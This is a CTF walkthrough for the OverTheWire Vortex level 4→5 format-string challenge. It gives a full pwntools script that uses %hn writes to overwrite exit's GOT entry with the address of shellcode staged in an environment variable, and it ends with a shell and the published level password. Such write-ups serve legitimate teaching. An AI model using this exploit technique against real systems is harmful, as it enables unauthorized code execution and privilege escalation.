# Vortex Level 4 → 5

## Goal

Format-string bug in `vortex4`. Use `%n` to overwrite the PLT entry for `exit` with the address of shellcode you've placed in an environment variable (or in the buffer itself). When the program eventually calls `exit`, control lands on your shellcode.

## Concepts you'll learn

- Using `%N$n` **direct-parameter access** to target a specific argument slot
- Splitting a 4-byte write into **two 2-byte writes** (low half + high half) to avoid dangerous bytes like `0x0a` (`\n`) in the padding
- PLT overwrites as a reliable hijack point — every later call to the function goes to your code

## Walkthrough

### 1. Confirm the format-string bug

```bash
$ /vortex/vortex4 "AAAA %p %p %p %p %p %p"
```

Your `AAAA` will show up as `0x41414141` somewhere in the `%p` output. Count how many `%p`s come before it; that's the parameter index you'll use with `%N$n` later.

### 2. Stage shellcode

```bash
$ export EGG=$(python3 -c 'from pwn import *; context(arch="i386"); sys.stdout.buffer.write(b"\x90"*200 + asm(shellcraft.setreuid() + shellcraft.execve("/bin//sh")))')
$ /tmp/getenv EGG /vortex/vortex4
EGG = 0xffffdf9c
```

(The `getenv` helper is described in [Behemoth 1](../behemoth/level01.md).)

### 3. Find the PLT entry for `exit`

```bash
$ objdump -d /vortex/vortex4 | grep -A1 '<exit@plt>:'
```

The GOT entry `exit@plt` that you'll overwrite is at `0x0804c008` in avishai's solve. Split it into two 2-byte writes:

- Low half at `0x0804c008` → write the **low 16 bits** of `0xffffdf9c` = `0xdf9c`
- High half at `0x0804c00a` → write the **high 16 bits** = `0xffff`

Doing two 2-byte writes keeps each `%n` value small and keeps `0x0a`/`\n` out of the padding count.

### 4. Craft the format string

Payload layout:

```
[ addr of low half (4 bytes) ][ addr of high half (4 bytes) ][ %pad1x%N$hn%pad2x%M$hn ]
```

- `addr of low half` = `\x08\xc0\x04\x08`
- `addr of high half` = `\x0a\xc0\x04\x08`
- `pad1x` pads the byte-count to `0xdf9c` (= 57244); subtract the 8 bytes already emitted → `%57236x`
- `pad2x` then pads from `0xdf9c` up to `0xffff` (= 65535); difference is `0x2063` = 8291 → `%8291x`
- `N` and `M` are the parameter indexes of the two address words (find them with the `%p`s in step 1)

```python
# level4.py
from pwn import *
low = 0x0804c008
high = 0x0804c00a
target = 0xffffdf9c
N, M = 7, 8  # adjust based on your %p walk
payload = p32(low) + p32(high)
payload += f"%{(target & 0xFFFF) - len(payload)}x%{N}$hn".encode()
payload += f"%{((target >> 16) & 0xFFFF) - (target & 0xFFFF)}x%{M}$hn".encode()
sys.stdout.buffer.write(payload)
```

### 5. Fire

```bash
$ /vortex/vortex4 "$(python3 level4.py)"
$ whoami
vortex5
$ cat /etc/vortex_pass/vortex5
heo3EbnS9
```

## The answer

The password for `vortex5` is:

**`heo3EbnS9`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex4.html>
